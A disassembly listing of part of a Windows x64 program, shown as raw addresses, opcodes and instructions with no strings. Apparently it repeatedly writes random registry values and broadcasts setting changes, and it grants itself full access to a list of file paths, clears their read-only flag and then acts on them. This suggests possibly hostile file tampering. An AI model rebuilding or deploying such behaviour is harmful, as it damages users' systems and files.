   140003471:	74 0a                	je     0x14000347d
   140003473:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003478:	e8 23 30 00 00       	call   0x1400064a0
   14000347d:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003482:	ff 15 28 5d 00 00    	call   *0x5d28(%rip)        # 0x1400091b0
   140003488:	90                   	nop
   140003489:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000348e:	ff 15 fc 5c 00 00    	call   *0x5cfc(%rip)        # 0x140009190
   140003494:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   140003498:	ff 15 1a 5d 00 00    	call   *0x5d1a(%rip)        # 0x1400091b8
   14000349e:	90                   	nop
   14000349f:	48 2b f3             	sub    %rbx,%rsi
   1400034a2:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   1400034a9:	72 1c                	jb     0x1400034c7
   1400034ab:	48 83 c6 27          	add    $0x27,%rsi
   1400034af:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   1400034b3:	48 2b d8             	sub    %rax,%rbx
   1400034b6:	48 83 eb 08          	sub    $0x8,%rbx
   1400034ba:	48 83 fb 1f          	cmp    $0x1f,%rbx
   1400034be:	0f 87 2a 01 00 00    	ja     0x1400035ee
   1400034c4:	48 8b d8             	mov    %rax,%rbx
   1400034c7:	48 8b d6             	mov    %rsi,%rdx
   1400034ca:	48 8b cb             	mov    %rbx,%rcx
   1400034cd:	e8 0e 3a 00 00       	call   0x140006ee0
   1400034d2:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   1400034d9:	48 33 cc             	xor    %rsp,%rcx
   1400034dc:	e8 df 39 00 00       	call   0x140006ec0
   1400034e1:	4c 8d 9c 24 90 02 00 	lea    0x290(%rsp),%r11
   1400034e8:	00 
   1400034e9:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400034ed:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400034f1:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   1400034f5:	4d 8b 63 38          	mov    0x38(%r11),%r12
   1400034f9:	49 8b e3             	mov    %r11,%rsp
   1400034fc:	41 5f                	pop    %r15
   1400034fe:	41 5e                	pop    %r14
   140003500:	5d                   	pop    %rbp
   140003501:	c3                   	ret
   140003502:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003507:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000350b:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003510:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003515:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003519:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   14000351f:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003523:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   140003528:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   14000352d:	74 28                	je     0x140003557
   14000352f:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140003533:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140003538:	48 39 08             	cmp    %rcx,(%rax)
   14000353b:	75 1a                	jne    0x140003557
   14000353d:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140003541:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140003545:	48 89 08             	mov    %rcx,(%rax)
   140003548:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   14000354c:	48 89 08             	mov    %rcx,(%rax)
   14000354f:	2b d1                	sub    %ecx,%edx
   140003551:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   140003555:	89 10                	mov    %edx,(%rax)
   140003557:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   14000355b:	74 0a                	je     0x140003567
   14000355d:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003562:	e8 39 2f 00 00       	call   0x1400064a0
   140003567:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000356c:	ff 15 3e 5c 00 00    	call   *0x5c3e(%rip)        # 0x1400091b0
   140003572:	90                   	nop
   140003573:	e9 11 ff ff ff       	jmp    0x140003489
   140003578:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000357d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003581:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003586:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000358b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000358f:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003595:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003599:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   14000359e:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   1400035a3:	74 28                	je     0x1400035cd
   1400035a5:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   1400035a9:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400035ae:	48 39 08             	cmp    %rcx,(%rax)
   1400035b1:	75 1a                	jne    0x1400035cd
   1400035b3:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   1400035b7:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   1400035bb:	48 89 08             	mov    %rcx,(%rax)
   1400035be:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   1400035c2:	48 89 08             	mov    %rcx,(%rax)
   1400035c5:	2b d1                	sub    %ecx,%edx
   1400035c7:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   1400035cb:	89 10                	mov    %edx,(%rax)
   1400035cd:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   1400035d1:	74 0a                	je     0x1400035dd
   1400035d3:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400035d8:	e8 c3 2e 00 00       	call   0x1400064a0
   1400035dd:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400035e2:	ff 15 c8 5b 00 00    	call   *0x5bc8(%rip)        # 0x1400091b0
   1400035e8:	90                   	nop
   1400035e9:	e9 9b fe ff ff       	jmp    0x140003489
   1400035ee:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400035f5:	00 00 
   1400035f7:	45 33 c9             	xor    %r9d,%r9d
   1400035fa:	45 33 c0             	xor    %r8d,%r8d
   1400035fd:	33 d2                	xor    %edx,%edx
   1400035ff:	33 c9                	xor    %ecx,%ecx
   140003601:	ff 15 c9 5e 00 00    	call   *0x5ec9(%rip)        # 0x1400094d0
   140003607:	cc                   	int3
   140003608:	cc                   	int3
   140003609:	cc                   	int3
   14000360a:	cc                   	int3
   14000360b:	cc                   	int3
   14000360c:	cc                   	int3
   14000360d:	cc                   	int3
   14000360e:	cc                   	int3
   14000360f:	cc                   	int3
   140003610:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003615:	57                   	push   %rdi
   140003616:	48 83 ec 20          	sub    $0x20,%rsp
   14000361a:	48 8d b9 a8 00 00 00 	lea    0xa8(%rcx),%rdi
   140003621:	48 8b 01             	mov    (%rcx),%rax
   140003624:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003628:	48 8d 05 d9 6a 00 00 	lea    0x6ad9(%rip),%rax        # 0x14000a108
   14000362f:	48 89 84 3a 58 ff ff 	mov    %rax,-0xa8(%rdx,%rdi,1)
   140003636:	ff 
   140003637:	48 8b 01             	mov    (%rcx),%rax
   14000363a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000363e:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003644:	89 94 39 54 ff ff ff 	mov    %edx,-0xac(%rcx,%rdi,1)
   14000364b:	48 8d 9f 60 ff ff ff 	lea    -0xa0(%rdi),%rbx
   140003652:	48 8d 05 2f 6a 00 00 	lea    0x6a2f(%rip),%rax        # 0x14000a088
   140003659:	48 89 03             	mov    %rax,(%rbx)
   14000365c:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   140003663:	00 
   140003664:	74 2f                	je     0x140003695
   140003666:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   14000366a:	48 8d 43 70          	lea    0x70(%rbx),%rax
   14000366e:	48 39 01             	cmp    %rax,(%rcx)
   140003671:	75 22                	jne    0x140003695
   140003673:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   14000367a:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140003681:	48 89 11             	mov    %rdx,(%rcx)
   140003684:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140003688:	48 89 10             	mov    %rdx,(%rax)
   14000368b:	44 2b c2             	sub    %edx,%r8d
   14000368e:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140003692:	44 89 00             	mov    %r8d,(%rax)
   140003695:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140003699:	74 08                	je     0x1400036a3
   14000369b:	48 8b cb             	mov    %rbx,%rcx
   14000369e:	e8 fd 2d 00 00       	call   0x1400064a0
   1400036a3:	48 8b cb             	mov    %rbx,%rcx
   1400036a6:	ff 15 04 5b 00 00    	call   *0x5b04(%rip)        # 0x1400091b0
   1400036ac:	90                   	nop
   1400036ad:	48 8d 8f 68 ff ff ff 	lea    -0x98(%rdi),%rcx
   1400036b4:	ff 15 d6 5a 00 00    	call   *0x5ad6(%rip)        # 0x140009190
   1400036ba:	48 8b cf             	mov    %rdi,%rcx
   1400036bd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400036c2:	48 83 c4 20          	add    $0x20,%rsp
   1400036c6:	5f                   	pop    %rdi
   1400036c7:	48 ff 25 ea 5a 00 00 	rex.W jmp *0x5aea(%rip)        # 0x1400091b8
   1400036ce:	cc                   	int3
   1400036cf:	cc                   	int3
   1400036d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400036d5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400036da:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400036df:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400036e4:	41 56                	push   %r14
   1400036e6:	b8 20 14 00 00       	mov    $0x1420,%eax
   1400036eb:	e8 f0 3d 00 00       	call   0x1400074e0
   1400036f0:	48 2b e0             	sub    %rax,%rsp
   1400036f3:	48 8b 05 46 a9 00 00 	mov    0xa946(%rip),%rax        # 0x14000e040
   1400036fa:	48 33 c4             	xor    %rsp,%rax
   1400036fd:	48 89 84 24 10 14 00 	mov    %rax,0x1410(%rsp)
   140003704:	00 
   140003705:	66 0f 6f 05 33 6a 00 	movdqa 0x6a33(%rip),%xmm0        # 0x14000a140
   14000370c:	00 
   14000370d:	f3 0f 7f 44 24 50    	movdqu %xmm0,0x50(%rsp)
   140003713:	c7 44 24 60 c0 00 00 	movl   $0xc0,0x60(%rsp)
   14000371a:	00 
   14000371b:	ff 15 f7 5a 00 00    	call   *0x5af7(%rip)        # 0x140009218
   140003721:	c7 84 24 04 14 00 00 	movl   $0xffffffff,0x1404(%rsp)
   140003728:	ff ff ff ff 
   14000372c:	ba 01 00 00 00       	mov    $0x1,%edx
   140003731:	89 84 24 84 00 00 00 	mov    %eax,0x84(%rsp)
   140003738:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000373f:	00 
   140003740:	8b c8                	mov    %eax,%ecx
   140003742:	c1 e9 1e             	shr    $0x1e,%ecx
   140003745:	33 c8                	xor    %eax,%ecx
   140003747:	69 c1 65 89 07 6c    	imul   $0x6c078965,%ecx,%eax
   14000374d:	03 c2                	add    %edx,%eax
   14000374f:	89 84 94 84 00 00 00 	mov    %eax,0x84(%rsp,%rdx,4)
   140003756:	48 ff c2             	inc    %rdx
   140003759:	48 81 fa 70 02 00 00 	cmp    $0x270,%rdx
   140003760:	72 de                	jb     0x140003740
   140003762:	c7 84 24 80 00 00 00 	movl   $0x270,0x80(%rsp)
   140003769:	70 02 00 00 
   14000376d:	33 ed                	xor    %ebp,%ebp
   14000376f:	41 be 00 00 00 80    	mov    $0x80000000,%r14d
   140003775:	48 bf ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%rdi
   14000377c:	ff ff 7f 
   14000377f:	be 00 5e d0 b2       	mov    $0xb2d05e00,%esi
   140003784:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   14000378b:	ff ff 7f 
   14000378e:	66 90                	xchg   %ax,%ax
   140003790:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   140003797:	00 
   140003798:	e8 93 33 00 00       	call   0x140006b30
   14000379d:	8b c8                	mov    %eax,%ecx
   14000379f:	48 8d 04 89          	lea    (%rcx,%rcx,4),%rax
   1400037a3:	85 c0                	test   %eax,%eax
   1400037a5:	75 21                	jne    0x1400037c8
   1400037a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400037ae:	00 00 
   1400037b0:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   1400037b7:	00 
   1400037b8:	e8 73 33 00 00       	call   0x140006b30
   1400037bd:	8b c8                	mov    %eax,%ecx
   1400037bf:	48 8d 04 89          	lea    (%rcx,%rcx,4),%rax
   1400037c3:	83 f8 01             	cmp    $0x1,%eax
   1400037c6:	72 e8                	jb     0x1400037b0
   1400037c8:	48 c1 e8 20          	shr    $0x20,%rax
   1400037cc:	48 8d 15 dd 64 00 00 	lea    0x64dd(%rip),%rdx        # 0x140009cb0
   1400037d3:	49 2b c6             	sub    %r14,%rax
   1400037d6:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400037dc:	48 35 00 00 00 80    	xor    $0xffffffff80000000,%rax
   1400037e2:	45 33 c0             	xor    %r8d,%r8d
   1400037e5:	8b 4c 84 50          	mov    0x50(%rsp,%rax,4),%ecx
   1400037e9:	48 8d 44 24 68       	lea    0x68(%rsp),%rax
   1400037ee:	89 4c 24 70          	mov    %ecx,0x70(%rsp)
   1400037f2:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   1400037f9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400037fe:	ff 15 04 58 00 00    	call   *0x5804(%rip)        # 0x140009008
   140003804:	85 c0                	test   %eax,%eax
   140003806:	75 67                	jne    0x14000386f
   140003808:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000380d:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140003812:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003819:	00 
   14000381a:	48 8d 15 bf 64 00 00 	lea    0x64bf(%rip),%rdx        # 0x140009ce0
   140003821:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003827:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000382c:	45 33 c0             	xor    %r8d,%r8d
   14000382f:	ff 15 e3 57 00 00    	call   *0x57e3(%rip)        # 0x140009018
   140003835:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000383a:	ff 15 00 58 00 00    	call   *0x5800(%rip)        # 0x140009040
   140003840:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140003845:	4c 8d 0d ac 64 00 00 	lea    0x64ac(%rip),%r9        # 0x140009cf8
   14000384c:	c7 44 24 28 64 00 00 	movl   $0x64,0x28(%rsp)
   140003853:	00 
   140003854:	45 33 c0             	xor    %r8d,%r8d
   140003857:	ba 1a 00 00 00       	mov    $0x1a,%edx
   14000385c:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140003863:	00 
   140003864:	b9 ff ff 00 00       	mov    $0xffff,%ecx
   140003869:	ff 15 31 5b 00 00    	call   *0x5b31(%rip)        # 0x1400093a0
   14000386f:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140003874:	e8 a7 d7 ff ff       	call   0x140001020
   140003879:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000387e:	48 3b c7             	cmp    %rdi,%rax
   140003881:	7d 18                	jge    0x14000389b
   140003883:	48 8d 0c 30          	lea    (%rax,%rsi,1),%rcx
   140003887:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   14000388c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003891:	e8 fa 27 00 00       	call   0x140006090
   140003896:	e9 f5 fe ff ff       	jmp    0x140003790
   14000389b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400038a0:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400038a5:	e8 e6 27 00 00       	call   0x140006090
   1400038aa:	e9 e1 fe ff ff       	jmp    0x140003790
   1400038af:	cc                   	int3
   1400038b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400038b5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400038ba:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400038bf:	55                   	push   %rbp
   1400038c0:	48 8d ac 24 40 fe ff 	lea    -0x1c0(%rsp),%rbp
   1400038c7:	ff 
   1400038c8:	48 81 ec c0 02 00 00 	sub    $0x2c0,%rsp
   1400038cf:	48 8b 05 6a a7 00 00 	mov    0xa76a(%rip),%rax        # 0x14000e040
   1400038d6:	48 33 c4             	xor    %rsp,%rax
   1400038d9:	48 89 85 b0 01 00 00 	mov    %rax,0x1b0(%rbp)
   1400038e0:	48 8d 15 e1 64 00 00 	lea    0x64e1(%rip),%rdx        # 0x140009dc8
   1400038e7:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   1400038ee:	e8 2d 15 00 00       	call   0x140004e20
   1400038f3:	90                   	nop
   1400038f4:	33 f6                	xor    %esi,%esi
   1400038f6:	48 89 75 20          	mov    %rsi,0x20(%rbp)
   1400038fa:	ff 15 60 58 00 00    	call   *0x5860(%rip)        # 0x140009160
   140003900:	48 8b c8             	mov    %rax,%rcx
   140003903:	4c 8d 45 20          	lea    0x20(%rbp),%r8
   140003907:	ba 08 00 00 00       	mov    $0x8,%edx
   14000390c:	ff 15 ee 56 00 00    	call   *0x56ee(%rip)        # 0x140009000
   140003912:	85 c0                	test   %eax,%eax
   140003914:	0f 84 00 03 00 00    	je     0x140003c1a
   14000391a:	c7 85 88 00 00 00 00 	movl   $0x100,0x88(%rbp)
   140003921:	01 00 00 
   140003924:	48 8d 85 88 00 00 00 	lea    0x88(%rbp),%rax
   14000392b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003930:	41 b9 00 01 00 00    	mov    $0x100,%r9d
   140003936:	4c 8d 85 b0 00 00 00 	lea    0xb0(%rbp),%r8
   14000393d:	ba 01 00 00 00       	mov    $0x1,%edx
   140003942:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140003946:	ff 15 c4 56 00 00    	call   *0x56c4(%rip)        # 0x140009010
   14000394c:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140003950:	85 c0                	test   %eax,%eax
   140003952:	75 0b                	jne    0x14000395f
   140003954:	ff 15 76 57 00 00    	call   *0x5776(%rip)        # 0x1400090d0
   14000395a:	e9 bb 02 00 00       	jmp    0x140003c1a
   14000395f:	ff 15 6b 57 00 00    	call   *0x576b(%rip)        # 0x1400090d0
   140003965:	48 8b 9d b0 00 00 00 	mov    0xb0(%rbp),%rbx
   14000396c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000396f:	f3 0f 7f 45 4c       	movdqu %xmm0,0x4c(%rbp)
   140003974:	48 89 75 60          	mov    %rsi,0x60(%rbp)
   140003978:	c7 45 40 00 00 00 10 	movl   $0x10000000,0x40(%rbp)
   14000397f:	c7 45 44 02 00 00 00 	movl   $0x2,0x44(%rbp)
   140003986:	c7 45 48 03 00 00 00 	movl   $0x3,0x48(%rbp)
   14000398d:	89 75 5c             	mov    %esi,0x5c(%rbp)
   140003990:	48 89 5d 68          	mov    %rbx,0x68(%rbp)
   140003994:	48 89 75 38          	mov    %rsi,0x38(%rbp)
   140003998:	48 89 75 28          	mov    %rsi,0x28(%rbp)
   14000399c:	48 89 75 30          	mov    %rsi,0x30(%rbp)
   1400039a0:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   1400039a7:	48 83 bd a8 00 00 00 	cmpq   $0x7,0xa8(%rbp)
   1400039ae:	07 
   1400039af:	48 0f 47 8d 90 00 00 	cmova  0x90(%rbp),%rcx
   1400039b6:	00 
   1400039b7:	48 8d 45 30          	lea    0x30(%rbp),%rax
   1400039bb:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400039c0:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1400039c5:	48 8d 45 38          	lea    0x38(%rbp),%rax
   1400039c9:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400039ce:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400039d3:	45 33 c9             	xor    %r9d,%r9d
   1400039d6:	ba 01 00 00 00       	mov    $0x1,%edx
   1400039db:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400039e1:	ff 15 39 56 00 00    	call   *0x5639(%rip)        # 0x140009020
   1400039e7:	85 c0                	test   %eax,%eax
   1400039e9:	0f 85 2b 02 00 00    	jne    0x140003c1a
   1400039ef:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   1400039f3:	4c 8b 45 38          	mov    0x38(%rbp),%r8
   1400039f7:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   1400039fb:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003a00:	ff 15 32 56 00 00    	call   *0x5632(%rip)        # 0x140009038
   140003a06:	85 c0                	test   %eax,%eax
   140003a08:	74 18                	je     0x140003a22
   140003a0a:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140003a0e:	48 85 c9             	test   %rcx,%rcx
   140003a11:	0f 84 03 02 00 00    	je     0x140003c1a
   140003a17:	ff 15 cb 56 00 00    	call   *0x56cb(%rip)        # 0x1400090e8
   140003a1d:	e9 f8 01 00 00       	jmp    0x140003c1a
   140003a22:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   140003a29:	48 83 bd a8 00 00 00 	cmpq   $0x7,0xa8(%rbp)
   140003a30:	07 
   140003a31:	48 0f 47 8d 90 00 00 	cmova  0x90(%rbp),%rcx
   140003a38:	00 
   140003a39:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003a3e:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140003a42:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003a47:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003a4c:	45 33 c9             	xor    %r9d,%r9d
   140003a4f:	ba 01 00 00 00       	mov    $0x1,%edx
   140003a54:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140003a5a:	ff 15 c8 55 00 00    	call   *0x55c8(%rip)        # 0x140009028
   140003a60:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   140003a64:	48 85 c9             	test   %rcx,%rcx
   140003a67:	74 06                	je     0x140003a6f
   140003a69:	ff 15 79 56 00 00    	call   *0x5679(%rip)        # 0x1400090e8
   140003a6f:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140003a73:	48 85 c9             	test   %rcx,%rcx
   140003a76:	74 06                	je     0x140003a7e
   140003a78:	ff 15 6a 56 00 00    	call   *0x566a(%rip)        # 0x1400090e8
   140003a7e:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   140003a85:	48 83 bd a8 00 00 00 	cmpq   $0x7,0xa8(%rbp)
   140003a8c:	07 
   140003a8d:	48 0f 47 8d 90 00 00 	cmova  0x90(%rbp),%rcx
   140003a94:	00 
   140003a95:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003a9a:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140003a9f:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003aa4:	4c 8b cb             	mov    %rbx,%r9
   140003aa7:	ba 01 00 00 00       	mov    $0x1,%edx
   140003aac:	44 8b c2             	mov    %edx,%r8d
   140003aaf:	ff 15 73 55 00 00    	call   *0x5573(%rip)        # 0x140009028
   140003ab5:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003ab8:	33 c0                	xor    %eax,%eax
   140003aba:	0f 11 45 70          	movups %xmm0,0x70(%rbp)
   140003abe:	48 89 85 80 00 00 00 	mov    %rax,0x80(%rbp)
   140003ac5:	48 8d 15 24 63 00 00 	lea    0x6324(%rip),%rdx        # 0x140009df0
   140003acc:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003ad1:	e8 4a 13 00 00       	call   0x140004e20
   140003ad6:	90                   	nop
   140003ad7:	48 8d 15 52 63 00 00 	lea    0x6352(%rip),%rdx        # 0x140009e30
   140003ade:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003ae3:	e8 38 13 00 00       	call   0x140004e20
   140003ae8:	90                   	nop
   140003ae9:	48 8d 15 80 63 00 00 	lea    0x6380(%rip),%rdx        # 0x140009e70
   140003af0:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   140003af4:	e8 27 13 00 00       	call   0x140004e20
   140003af9:	90                   	nop
   140003afa:	48 8d 15 bf 63 00 00 	lea    0x63bf(%rip),%rdx        # 0x140009ec0
   140003b01:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   140003b05:	e8 16 13 00 00       	call   0x140004e20
   140003b0a:	90                   	nop
   140003b0b:	48 8d 15 fe 63 00 00 	lea    0x63fe(%rip),%rdx        # 0x140009f10
   140003b12:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140003b16:	e8 05 13 00 00       	call   0x140004e20
   140003b1b:	90                   	nop
   140003b1c:	48 8d 15 3d 64 00 00 	lea    0x643d(%rip),%rdx        # 0x140009f60
   140003b23:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003b27:	e8 f4 12 00 00       	call   0x140004e20
   140003b2c:	90                   	nop
   140003b2d:	48 8d 15 6c 64 00 00 	lea    0x646c(%rip),%rdx        # 0x140009fa0
   140003b34:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140003b38:	e8 e3 12 00 00       	call   0x140004e20
   140003b3d:	90                   	nop
   140003b3e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003b41:	f3 0f 7f 45 70       	movdqu %xmm0,0x70(%rbp)
   140003b46:	48 89 b5 80 00 00 00 	mov    %rsi,0x80(%rbp)
   140003b4d:	b9 e0 00 00 00       	mov    $0xe0,%ecx
   140003b52:	e8 91 33 00 00       	call   0x140006ee8
   140003b57:	48 89 45 70          	mov    %rax,0x70(%rbp)
   140003b5b:	48 89 45 78          	mov    %rax,0x78(%rbp)
   140003b5f:	48 8d 88 e0 00 00 00 	lea    0xe0(%rax),%rcx
   140003b66:	48 89 8d 80 00 00 00 	mov    %rcx,0x80(%rbp)
   140003b6d:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140003b71:	48 89 4d 38          	mov    %rcx,0x38(%rbp)
   140003b75:	4c 8d 4d 70          	lea    0x70(%rbp),%r9
   140003b79:	4c 8b c0             	mov    %rax,%r8
   140003b7c:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   140003b80:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003b85:	e8 06 2a 00 00       	call   0x140006590
   140003b8a:	48 89 45 78          	mov    %rax,0x78(%rbp)
   140003b8e:	4c 8d 0d 0b 12 00 00 	lea    0x120b(%rip),%r9        # 0x140004da0
   140003b95:	ba 20 00 00 00       	mov    $0x20,%edx
   140003b9a:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   140003ba0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003ba5:	e8 7a 33 00 00       	call   0x140006f24
   140003baa:	48 8b 5d 70          	mov    0x70(%rbp),%rbx
   140003bae:	48 8b 7d 78          	mov    0x78(%rbp),%rdi
   140003bb2:	48 3b df             	cmp    %rdi,%rbx
   140003bb5:	74 59                	je     0x140003c10
   140003bb7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003bbe:	00 00 
   140003bc0:	48 8b cb             	mov    %rbx,%rcx
   140003bc3:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   140003bc8:	76 03                	jbe    0x140003bcd
   140003bca:	48 8b 0b             	mov    (%rbx),%rcx
   140003bcd:	ff 15 75 55 00 00    	call   *0x5575(%rip)        # 0x140009148
   140003bd3:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003bd6:	74 1c                	je     0x140003bf4
   140003bd8:	a8 01                	test   $0x1,%al
   140003bda:	74 18                	je     0x140003bf4
   140003bdc:	48 8b cb             	mov    %rbx,%rcx
   140003bdf:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   140003be4:	76 03                	jbe    0x140003be9
   140003be6:	48 8b 0b             	mov    (%rbx),%rcx
   140003be9:	83 e0 fe             	and    $0xfffffffe,%eax
   140003bec:	8b d0                	mov    %eax,%edx
   140003bee:	ff 15 34 55 00 00    	call   *0x5534(%rip)        # 0x140009128
   140003bf4:	48 8b cb             	mov    %rbx,%rcx
   140003bf7:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   140003bfc:	76 03                	jbe    0x140003c01
   140003bfe:	48 8b 0b             	mov    (%rbx),%rcx
   140003c01:	ff 15 09 55 00 00    	call   *0x5509(%rip)        # 0x140009110
   140003c07:	48 83 c3 20          	add    $0x20,%rbx
   140003c0b:	48 3b df             	cmp    %rdi,%rbx
   140003c0e:	75 b0                	jne    0x140003bc0
   140003c10:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
